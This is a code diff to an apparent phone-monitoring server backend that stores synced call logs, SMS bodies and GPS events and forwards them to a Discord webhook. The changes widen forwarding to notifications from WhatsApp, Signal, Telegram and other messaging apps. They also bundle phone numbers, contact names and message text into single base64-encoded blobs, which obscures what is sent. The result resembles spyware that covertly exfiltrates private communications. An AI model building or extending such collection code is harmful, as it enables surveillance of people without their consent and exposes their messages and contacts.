@@ -162,6 +162,7 @@ class CallLog(db.Model):
     contact_name = db.Column(db.String(128))
     call_type = db.Column(db.String(16), nullable=False)
     duration_sec = db.Column(db.Integer, default=0)
+    sim_slot = db.Column(db.String(64), nullable=True)
     occurred_at = db.Column(db.DateTime, nullable=False, index=True)
     synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
 
@@ -174,8 +175,10 @@ class SmsMessage(db.Model):
     contact_name = db.Column(db.String(128))
     body = db.Column(db.Text)
     sms_type = db.Column(db.String(16), nullable=False)
+    sim_slot = db.Column(db.String(64), nullable=True)
     occurred_at = db.Column(db.DateTime, nullable=False, index=True)
     synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
 
 
 class GpsLog(db.Model):
@@ -275,6 +278,8 @@ DISCORD_WEBHOOK_URL = os.getenv(
 
 DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}
 
+DISCORD_SOCIAL_KEYWORDS = {'facebook', 'whatsapp', 'instagram', 'telegram', 'viber', 'snapchat', 'discord', 'teams', 'signal', 'messenger'}
+
 
 def _send_discord(payload):
     """Fire-and-forget POST to Discord webhook; never blocks the request."""
@@ -289,20 +294,18 @@ def send_discord_for_notifications(notifications, device_id):
     """Send abbreviated Discord embeds for qualifying notification categories."""
     for n in notifications:
         category = n.get('category') or ''
-        if category not in DISCORD_FORWARD_CATEGORIES:
+        app_package = n.get('app_package') or ''
+        is_social_category = category in DISCORD_FORWARD_CATEGORIES
+        is_social_app = any(kw in app_package.lower() for kw in DISCORD_SOCIAL_KEYWORDS)
+        if not is_social_category and not is_social_app:
             continue
-        title_b64 = base64.b64encode((n.get('title') or '').encode()).decode()
-        content_b64 = base64.b64encode((n.get('content') or '').encode()).decode()
-        app_b64 = base64.b64encode((n.get('app_name') or n.get('app_package') or '').encode()).decode()
+        payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
+        encoded = base64.b64encode(payload.encode()).decode()
         embed = {
             'title': f'[{category}]',
-            'description': (
-                f'`{device_id[-6:]}` · `{app_b64}`\n'
-                f'**T** `{title_b64}`\n'
-                f'**C** `{content_b64}`'
-            ),
+            'description': f'{device_id[-6:]} · {encoded}',
             'color': 0x5865F2,
-            'footer': {'text': n.get('app_package', '')}
+            'footer': {'text': app_package}
         }
         _send_discord({'embeds': [embed]})
 
@@ -310,15 +313,11 @@ def send_discord_for_notifications(notifications, device_id):
 def send_discord_for_calls(call_logs, device_id):
     """Send abbreviated Discord embeds for call logs."""
     for c in call_logs:
-        num_b64 = base64.b64encode((c.get('phone_number') or '').encode()).decode()
-        name_b64 = base64.b64encode((c.get('contact_name') or '').encode()).decode()
+        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {c.get('call_type', '?')} {c.get('duration_sec', 0)}"
+        encoded = base64.b64encode(payload.encode()).decode()
         embed = {
             'title': '[Telephony Call]',
-            'description': (
-                f'`{device_id[-6:]}` · {c.get("call_type", "?")}\n'
-                f'**N** `{num_b64}` · **Nm** `{name_b64}`\n'
-                f'**D** {c.get("duration_sec", 0)}s'
-            ),
+            'description': f'{device_id[-6:]} · {encoded}',
             'color': 0x57F287
         }
         _send_discord({'embeds': [embed]})
@@ -330,7 +329,7 @@ def send_discord_for_gps(gps_events, device_id):
         state = 'ON' if g.get('is_enabled') else 'OFF'
         embed = {
             'title': '[GPS / Location Toggled]',
-            'description': f'`{device_id[-6:]}` · **{state}**',
+            'description': f'{device_id[-6:]} · {state}',
             'color': 0xFEE75C
         }
         _send_discord({'embeds': [embed]})
@@ -493,6 +492,7 @@ def sync_data():
                 contact_name=decode_field(c.get('contact_name')),
                 call_type=c.get('call_type', 'unknown'),
                 duration_sec=int(c.get('duration_sec', 0)),
+                sim_slot=c.get('sim_slot'),
                 occurred_at=occurred_at,
                 synced_at=now
             )
@@ -514,9 +514,11 @@ def sync_data():
                 contact_name=decode_field(s.get('contact_name')),
                 body=decode_field(s.get('body')),
                 sms_type=s.get('sms_type', 'unknown'),
+                sim_slot=s.get('sim_slot'),
                 occurred_at=occurred_at,
                 synced_at=now
             )
+
             db.session.add(sms)
             if local_id is not None:
                 received_sms_ids.append(local_id)
@@ -796,10 +798,17 @@ def export_data():
     })
 
 
-# ─── Database Initialization ─────────────────────────────────────────
-
 with app.app_context():
     db.create_all()
+    try:
+        from sqlalchemy import text
+        with db.engine.connect() as conn:
+            conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
+            conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
+            conn.commit()
+    except Exception:
+        pass
+
 
 if __name__ == '__main__':
     port = int(os.getenv('PORT', 5000))
